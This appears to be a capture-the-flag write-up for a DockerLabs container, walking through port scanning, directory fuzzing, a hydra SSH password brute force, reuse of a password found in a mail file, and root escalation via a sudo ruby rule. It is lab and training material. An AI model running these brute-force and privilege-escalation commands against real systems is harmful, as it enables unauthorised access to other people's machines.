# IP
172.17.0.2
# Enumeration
## ICMP
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.057 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.052 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1005ms
rtt min/avg/max/mdev = 0.052/0.054/0.057/0.002 ms
```

Device is recognisable
## Ports scanning
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ nmap -sV 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-09 19:27 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 1A:85:5F:DF:24:E6 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two open ports:
- 22 -> SSH
- 80 -> HTTP
## Dir Fuzzing
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,conf,sh,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,conf,sh,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess.conf       (Status: 403) [Size: 275]
.hta.conf            (Status: 403) [Size: 275]
.htaccess.sh         (Status: 403) [Size: 275]
.htaccess.html       (Status: 403) [Size: 275]
.htaccess.php        (Status: 403) [Size: 275]
.htaccess            (Status: 403) [Size: 275]
.hta.php             (Status: 403) [Size: 275]
.hta.html            (Status: 403) [Size: 275]
.hta.txt             (Status: 403) [Size: 275]
.hta.sh              (Status: 403) [Size: 275]
.hta                 (Status: 403) [Size: 275]
.htpasswd.php        (Status: 403) [Size: 275]
.htpasswd.txt        (Status: 403) [Size: 275]
.htpasswd.sh         (Status: 403) [Size: 275]
.htpasswd.conf       (Status: 403) [Size: 275]
.htpasswd            (Status: 403) [Size: 275]
.htpasswd.html       (Status: 403) [Size: 275]
.htaccess.txt        (Status: 403) [Size: 275]
index.html           (Status: 200) [Size: 74]
index.html           (Status: 200) [Size: 74]
javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
server-status        (Status: 403) [Size: 275]
Progress: 27678 / 27678 (100.00%)
===============================================================
Finished
===============================================================
```

Interesting findings
- Comment in /index.html
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ curl http://172.17.0.2/
<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
```

Possible SSH usernames juan and camilo

# Brute force
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-09 19:37:00
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: camilo   password: password1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-09 19:37:02
```

Found password:password1 for user camilo
# Priviledge Escalation
#### SSH login as camilo
As the hint found in the direction web fuzzing says we should look out for the mail juan sent to camilo

```sh
$ cat correo.txt
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

Found password:2k84dic for username juan

#### SSH login as juan
```sh
$ sudo -l
Matching Defaults entries for juan on dd2ae334ecf8:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User juan may run the following commands on dd2ae334ecf8:
    (ALL) NOPASSWD: /usr/bin/ruby
```

We could find a way to root the device using sudo

```sh
$ sudo ruby -e 'exec "/bin/sh"'
# whoami
root
```